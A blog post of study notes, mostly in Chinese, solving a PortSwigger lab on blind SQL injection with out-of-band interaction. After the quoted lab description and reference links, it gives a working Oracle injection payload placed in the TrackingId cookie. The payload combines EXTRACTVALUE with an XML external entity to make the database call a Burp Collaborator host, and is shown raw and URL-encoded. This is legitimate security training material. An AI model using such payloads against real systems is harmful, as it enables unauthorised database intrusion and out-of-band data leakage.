---
layout: post
title: "Blind SQL injection with out-of-band interaction"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---





# Blind SQL injection with out-of-band interaction


```
This lab contains a [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability to cause a DNS lookup to Burp Collaborator.

#### Learning path

If you're following our [learning path](https://portswigger.net/web-security/learning-path), please note that the suggested solution for this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

#### Hint

You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).








本實驗室包含一個 [blind SQL injection](https://portswigger.net/web-security/sql-injection/blind) 漏洞。該應用程序使用跟踪 cookie 進行分析，並執行包含提交的 cookie 值的 SQL 查詢。

SQL 查詢是異步執行的，對應用程序的響應沒有影響。但是，您可以觸發與外部域的帶外交互。

為解決實驗室問題，利用 [SQL 注入](https://portswigger.net/web-security/sql-injection) 漏洞對 Burp Collaborator 進行 DNS 查找。

####學習路徑

如果您遵循我們的 [學習路徑](https://portswigger.net/web-security/learning-path)，請注意，此實驗室的建議解決方案需要對我們尚未涵蓋的主題有所了解。如果你被卡住了，不要擔心；一旦你進一步發展了你的知識，試著稍後再回來。

＃＃＃＃ 筆記

為了防止 Academy 平台被用於攻擊第三方，我們的防火牆阻止了實驗室與任意外部系統之間的交互。要解決實驗室，您必須使用 Burp Collaborator 的默認公共服務器。

＃＃＃＃ 暗示

您可以在我們的 [SQL 注入備忘單](https://portswigger.net/web-security/sql-injection/cheat-sheet) 上找到一些有用的有效負載。







```

EXTRACTVALUE 報錯注入:
https://blog.csdn.net/AI_SumSky/article/details/121708504

https://ithelp.ithome.com.tw/articles/10272660

https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/





payload 說明很清楚:
https://topic.alibabacloud.com/a/oracle-database-xxe-injection-vulnerability-analysis-cve-2014-6577_1_46_30022613.html

關鍵:
google 翻譯文章
這次引用的是參數實體而不是文檔實體：



總結: 以下語句可以 http 請求 

```
TrackingId=x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--


```


但要注意，許多特殊字元需要 url encode 

```
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

```

BURP-COLLABORATOR-SUBDOMAIN
```
sc8fydumc5nrx3fwzj33t9fvhmncb1.burpcollaborator.net
```


payload:
```

'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//sc8fydumc5nrx3fwzj33t9fvhmncb1.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--

```



這題叫你 ping 一下 DNS 而已。

